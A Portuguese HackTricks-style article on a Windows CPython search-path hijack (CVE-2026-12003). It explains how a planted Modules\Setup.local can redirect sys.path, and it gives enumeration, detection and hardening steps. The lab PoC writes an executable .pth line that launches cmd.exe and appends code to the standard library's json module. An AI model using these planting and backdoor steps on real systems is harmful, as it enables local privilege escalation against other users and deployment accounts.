# Build-Landmark do Windows CPython e Hijacking de `sys.path`

{{#include ../../../banners/hacktricks-training.md}}

Um runtime pode manter caminhos relativos que foram destinados apenas à sua árvore de build. Se um runtime privilegiado instalado resolver um desses caminhos para um diretório gravável por um usuário de baixo privilégio, um atacante pode plantar o **build landmark** esperado e fazer o runtime confiar em um prefixo de biblioteca alternativo. CVE-2026-12003 é um exemplo no Windows CPython: um `Modules\Setup.local` plantado pode redirecionar a entrada da biblioteca padrão em `sys.path` sem modificar a instalação protegida do Python.<sup>[[1]](#references)[[2]](#references)</sup>

## Cadeia de construção de caminhos do CPython

Builds afetados do Windows foram compilados com `VPATH=..\..` e o expuseram como `sys._vpath`. O fallback vulnerável em `Modules/getpath.py` tratava `VPATH\Modules\Setup.local` como evidência de que o interpretador estava sendo executado a partir de uma árvore de código-fonte; o fluxo de dados a seguir transforma esse valor de build em uma primitiva de search path em runtime.<sup>[[1]](#references)[[2]](#references)</sup>

| Estágio | Valor derivado para `C:\Program Files\Python314\python.exe` |
| --- | --- |
| Caminho de build compilado | `VPATH=..\..` |
| Build landmark em runtime | `C:\Program Files\Python314\..\..\Modules\Setup.local` |
| Build landmark criado pelo atacante | `C:\Modules\Setup.local` |
| `build_prefix` selecionado | `C:\` |
| Biblioteca padrão selecionada | `C:\Lib` |
| Resultado | `C:\Lib` controlado pelo atacante é anexado a `sys.path` |

A verificação é um fallback usado quando o `pybuilddir.txt` mais específico ao lado do executável está ausente ou não pode ser lido. Isso é importante porque um usuário de baixo privilégio pode não conseguir alterar `C:\Program Files\Python314`, mas ainda conseguir criar novos diretórios em `C:\`. O processo `python.exe` privilegiado posterior carrega código Python usando seu próprio access token.<sup>[[1]](#references)[[2]](#references)</sup>

### Pré-requisitos

Trate isso como uma fronteira de privilégio somente quando todas estas condições forem atendidas:<sup>[[1]](#references)[[2]](#references)</sup>

- O alvo é um build **Windows CPython** afetado; a lógica de resolução de caminhos vulnerável não é uma propriedade da linguagem Python.
- O diretório obtido ao resolver `..\..` a partir do diretório que contém `python.exe` permite que um usuário com menos privilégios crie o landmark e a árvore `Lib`.
- Um usuário, serviço, instalador ou conta de software-deployment com privilégios maiores inicia posteriormente esse interpretador.
- Nenhuma configuração de isolamento de caminhos substitui o caminho de descoberta vulnerável.

## Enumeração

Inspecione tanto o valor compilado quanto o search path efetivo. Um valor exposto `..\..` é uma pista útil, mas não prova a exploitabilidade: resolva também o caminho, teste as ACLs e confirme que um landmark plantado ficaria fora da instalação protegida.<sup>[[1]](#references)[[2]](#references)</sup>
```powershell
python -c "import os,sys; print(sys.executable); print(getattr(sys,'_vpath',None)); print(*sys.path, sep='\n')"

$pythonDir = python -c "import os,sys; print(os.path.dirname(sys.executable))"
$prefix = [IO.Path]::GetFullPath((Join-Path $pythonDir '..\..'))
$prefix
icacls $prefix
```
Não restrinja a avaliação aos instaladores oficiais. Para cada produto que inclua `python.exe`, resolva seu `sys._vpath` em relação ao diretório real do executável e analise as ACLs dos locais `Modules` e `Lib` resultantes. Um caminho de instalação mais profundo pode resolver para um diretório de aplicação ou fornecedor gravável diferente de `C:\`.<sup>[[1]](#references)</sup>

## Fluxo de exploração no laboratório

O PoC deste laboratório reproduz uma parte suficiente do runtime legítimo abaixo do prefixo selecionado para que o Python seja inicializado, adiciona uma linha `.pth` executável e, por fim, cria o landmark. Crie o payload antes do landmark para evitar deixar temporariamente o interpretador apontado para uma árvore de bibliotecas incompleta.<sup>[[1]](#references)</sup>
```powershell
$pythonDir = python -c "import os,sys; print(os.path.dirname(sys.executable))"
$root = [IO.Path]::GetFullPath((Join-Path $pythonDir '..\..'))
robocopy /E "$pythonDir\Lib" "$root\Lib" | Out-Null
robocopy /E "$pythonDir\DLLs" "$root\Lib" | Out-Null
New-Item "$root\Lib\site-packages" -ItemType Directory -Force | Out-Null
'import subprocess;subprocess.run(["cmd.exe","/c","whoami > %TEMP%\\py-landmark.txt"],shell=False)' |
Set-Content "$root\Lib\site-packages\audit.pth" -Encoding Ascii
New-Item "$root\Modules" -ItemType Directory -Force | Out-Null
New-Item "$root\Modules\Setup.local" -ItemType File -Force | Out-Null
```
Durante a inicialização normal do site, o Python processa arquivos `.pth` em diretórios reconhecidos de `site-packages`. Somente linhas que começam com `import` seguido de espaço em branco são executadas, e a instrução executável deve permanecer em uma única linha física; `python -S` suprime a importação automática de `site` e, portanto, esse trigger.<sup>[[1]](#references)[[4]](#references)</sup>

### Alternativa acionada por importação

A execução na inicialização não é necessária. Depois de reproduzir a árvore legítima da biblioteca, faça backdoor em um módulo que um script privilegiado importe previsivelmente. Por exemplo, adicionar código ao `Lib\json\__init__.py` implantado o executa quando a vítima importa `json`; escolher um módulo confiável, mas que não seja importado universalmente, pode tornar o trigger menos ruidoso.<sup>[[1]](#references)</sup>
```powershell
'open(r"C:\Windows\Temp\json-import-token.txt","w").write(__import__("subprocess").check_output(["whoami"]).decode())' |
Add-Content "$root\Lib\json\__init__.py" -Encoding Ascii
```
Esta variante ainda herda o token do processo que faz a importação, mas depende de o aplicativo-alvo importar o módulo modificado. Preserve o comportamento original do módulo ao testar software real; caso contrário, a importação poderá falhar antes que o workflow privilegiado pretendido seja concluído.<sup>[[1]](#references)</sup>

## Pre-installation planting

O Search-path planting pode preceder a instalação. Um usuário com poucos privilégios pode preparar a futura árvore `Lib` e `Modules\Setup.local` e, então, aguardar que um portal de software privilegiado, um workflow do help desk ou um sistema de deployment execute uma instalação para todos os usuários. Installers que iniciam o novo interpretador para instalar packages ou precompilar a biblioteca padrão podem acionar o payload sob a conta de deployment, sem que um administrador precise abrir o Python manualmente.<sup>[[1]](#references)</sup>

Isso também altera a revisão do deployment: inspecione os diretórios ancestrais graváveis e os diretórios de landmark/library preexistentes **antes** de instalar ou atualizar um runtime bundled, em vez de verificar apenas o diretório final de instalação após o deployment.<sup>[[1]](#references)</sup>

## Detecção e hardening

Pivôs úteis no host são o landmark inesperado e a árvore de library, seguidos por uma inicialização privilegiada do Python. Procure por `Modules\Setup.local`, `Lib\site-packages\*.pth` no nível raiz ou em locais inesperados, packages copiados da biblioteca padrão e arquivos de módulo cujo proprietário ou horário de criação seja diferente do da instalação protegida. Correlacione a criação desses itens por um usuário padrão com um `python.exe` elevado gerando `cmd.exe`, `powershell.exe`, ferramentas de gerenciamento de contas ou outros processos filhos incomuns.<sup>[[1]](#references)</sup>
```powershell
Get-Item C:\Modules\Setup.local -ErrorAction SilentlyContinue | Format-List FullName,CreationTime,LastWriteTime
Get-ChildItem C:\Lib\site-packages -Filter *.pth -ErrorAction SilentlyContinue |
Select-Object FullName,CreationTime,LastWriteTime
Get-ChildItem C:\Lib -Recurse -File -ErrorAction SilentlyContinue |
Get-Acl | Where-Object Owner -notmatch 'TrustedInstaller|Administrators|SYSTEM'
```
A correção upstream remove o fallback `VPATH\Modules\Setup.local` e faz de `pybuilddir.txt` o único indicador da árvore de build. Prefira um build fixo ou uma instalação por usuário gerenciada pelo gerenciador de instalação atual do Python. Quando a atualização for temporariamente impossível, proteja o ancestral resolvido e pré-crie `Modules` com ACLs restritivas; arquivos `._pth` controlados ou `PYTHONHOME` também podem alterar a descoberta, mas exigem testes de compatibilidade da aplicação.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

## References

- [1] [Bishop Fox - CVE-2026-12003: Hijacking de Search-Path do CPython no Windows e Escalação de Privilégios Local](https://bishopfox.com/blog/python-software-foundation-python-3-11-0a3-to-3-15-0b2)
- [2] [Issue #151544 do CPython - Search paths dentro da árvore podem ser habilitados sem modificar o diretório de instalação](https://github.com/python/cpython/issues/151544)
- [3] [Pull request #151545 do CPython - Remover o fallback `VPATH/Modules/Setup.local`](https://github.com/python/cpython/pull/151545)
- [4] [Documentação do Python - arquivos de configuração de caminho do `site`](https://docs.python.org/3/library/site.html)
{{#include ../../../banners/hacktricks-training.md}}
